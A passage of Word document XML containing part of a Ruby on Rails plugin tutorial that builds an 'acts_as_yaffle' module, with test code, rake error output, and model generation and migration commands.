      <w:pPr>
        <w:rPr>
          <w:vanish/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4440"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="256D6103" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="353C44E3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/lib/yaffle/acts_as_yaffle.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="642B8244" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="743167AE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Yaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="26637D84" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActsAsYaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51D2FBCE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    # your code will go here</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2612F949" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="40F22B21" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="702F89A0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 Add a Class Method</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ABFC1A6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This plugin will expect that you’ve added a method to your model named ‘last_squawk’. However, the plugin users might have already defined a method on their model named ‘last_squawk’ that they use for something else. This plugin will allow the name to be changed by adding a class method called ‘yaffle_text_field’.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5974E754" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To start out, write a failing test that shows the behavior you’d like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7608"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="0AEF1C72" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="74DB5C2D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/test/acts_as_yaffle_test.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1E6C224F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="356D0332" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'test_helper'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="32206E7B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="213B2BF1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActsAsYaffleTest &lt; Test::Unit::TestCase</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76118C6C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A44FD34" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_a_hickwalls_yaffle_text_field_should_be_last_squawk</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="63B27201" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal :last_squawk, Hickwall.yaffle_text_field</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4FCC8075" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7368D826" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="18392D3B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>test_a_wickwalls_yaffle_text_field_should_be_last_tweet</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6488FAFC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    assert_equal :last_tweet, Wickwall.yaffle_text_field</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="76118B7B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A20EA24" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7BC335AD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="1222F8CA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake</w:t>
      </w:r>
      <w:r>
        <w:t>, you should see the following:</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5BF163E7" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="62AF19C6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>1) Error:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="727CAA34" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    test_a_hickwalls_yaffle_text_field_should_be_last_squawk(ActsAsYaffleTest):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="339A6E99" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    NameError: uninitialized constant ActsAsYaffleTest::Hickwall</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4691B807" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        test/acts_as_yaffle_test.rb:6:in `test_a_hickwalls_yaffle_text_field_should_be_last_squawk'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F4DB337" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="42E13A8B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      2) Error:</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="558FC01C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    test_a_wickwalls_yaffle_text_field_should_be_last_tweet(ActsAsYaffleTest):</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06C9D54E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    NameError: uninitialized constant ActsAsYaffleTest::Wickwall</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0808D0BB" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>        test/acts_as_yaffle_test.rb:10:in `test_a_wickwalls_yaffle_text_field_should_be_last_tweet'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="553C3CAC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="02F068CE" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    5 tests, 3 assertions, 0 failures, 2 errors, 0 skips</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5692702F" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This tells us that we don’t have the necessary models (Hickwall and Wickwall) that we are trying to test. We can easily generate these models in our “dummy” Rails application by running the following commands from the test/dummy directory:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="1424F358" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4AE68EB2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ cd test/dummy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09FD116B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate model Hickwall last_squawk:string</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C91E5AD" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rails generate model Wickwall last_squawk:string last_tweet:string</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6898341C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Now you can create the necessary database tables in your testing database by navigating to your dummy app and migrating the database. First</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2640"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="4BEF5A5E" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3213F867" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ cd test/dummy</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="432D6647" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rake db:migrate</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FB989FC" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ rake db:test:prepare</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="386AAF7A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>While you are here, change the Hickwall and Wickwall models so that they know that they are supposed to act like yaffles.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6168"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="0938DCAE" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FDAA14D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># test/dummy/app/models/hickwall.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="316AF9D7" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6FFF721D" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Hickwall &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="35C9A78A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  acts_as_yaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="142D2D48" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="242ED5F6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33D2F7B0" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># test/dummy/app/models/wickwall.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3F74F30E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="049D2AF1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Wickwall &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1C8524A3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  acts_as_yaffle :yaffle_text_field</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :last_tweet</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3ADB46D3" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6576B263" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>We will also add code to define the acts_as_yaffle method.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="0D06779B" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15A65C21" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># yaffle/lib/yaffle/acts_as_yaffle.rb</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2A292180" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Yaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="06F6F83B" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ActsAsYaffle</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B9DA2E9" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    extend ActiveSupport::Concern</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="797F9650" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2EB67AD1" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    included do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2992723A" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7234EDCA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="73934C99" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
